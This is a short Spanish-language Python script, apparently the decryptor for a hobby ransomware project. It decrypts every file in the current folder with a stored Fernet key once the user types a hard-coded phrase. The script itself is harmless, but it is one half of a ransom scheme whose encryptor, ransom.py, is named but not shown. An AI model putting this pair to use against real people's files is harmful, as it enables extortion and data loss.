import os
from cryptography.fernet import Fernet 

files = []

for file in os.listdir():
    if file == "ransom.py" or file == ".ransom.py.swp" or file == "thekey.key" or file == "decypt.py":
            continue
    if os.path.isfile(file):
            files.append(file)

print(files)

with open("thekey.key", "rb") as key:
        secretkey = key.read()
        
secretphrase = "hola"
userphrase = input("Introduce la frase secreta\n")

if userphrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
    print("Disfruta de tus documentos")

if userphrase != secretphrase:
    print("Esa no es la frase, intente de nuevo")